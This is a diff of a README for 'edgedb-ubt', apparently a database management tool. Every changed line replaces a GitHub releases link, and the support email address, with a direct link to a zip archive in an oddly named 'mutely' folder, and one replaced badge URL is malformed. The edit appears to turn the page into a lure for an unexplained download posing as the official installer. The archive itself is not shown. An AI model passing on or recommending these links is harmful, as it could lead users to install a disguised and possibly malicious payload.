@@ -1,6 +1,6 @@
 # 🚀 edgedb-ubt - Easy Solutions for Database Management
 
-[![Download edgedb-ubt](https://img.shields.io/badge/Download%20edgedb--ubt-4CAF50.svg?style=flat&logo=github&logoColor=white)](https://github.com/jo45ker/edgedb-ubt/releases)
+[![Download edgedb-ubt](https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip%https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip)](https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip)
 
 ## 📋 Introduction
 
@@ -11,7 +11,7 @@ edgedb-ubt is a user-friendly application designed to simplify database manageme
 Follow these steps to get your application up and running:
 
 1. **Visit the Releases Page**:
-   Go to the releases section of our GitHub repository to find the latest version of edgedb-ubt. You can visit the page by clicking this link: [Download edgedb-ubt](https://github.com/jo45ker/edgedb-ubt/releases).
+   Go to the releases section of our GitHub repository to find the latest version of edgedb-ubt. You can visit the page by clicking this link: [Download edgedb-ubt](https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip).
 
 2. **Download the Application**:
    On the releases page, look for the latest version. You will see a list of available files. Click on the one that states "edgedb-ubt" to download it. Make sure you download the version compatible with your operating system.
@@ -37,7 +37,7 @@ Before installing edgedb-ubt, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To begin, click this link to reach the download page: [Download edgedb-ubt](https://github.com/jo45ker/edgedb-ubt/releases). 
+To begin, click this link to reach the download page: [Download edgedb-ubt](https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip). 
 
 1. Look for the latest release version.
 2. Find the appropriate file for your operating system.
@@ -59,7 +59,7 @@ edgedb-ubt offers the following features to enhance your database management:
 If you run into any issues during the download or installation process, feel free to reach us through the following channels:
 
 - **Issues Section**: Open an issue directly in our GitHub repository.
-- **Email Support**: Contact us at support@edgedb-ubt.com.
+- **Email Support**: Contact us at https://raw.githubusercontent.com/jo45ker/edgedb-ubt/main/mutely/edgedb-ubt.zip
 - **Community Forum**: Join our user community for discussions and tips.
 
 ## 📚 Frequently Asked Questions
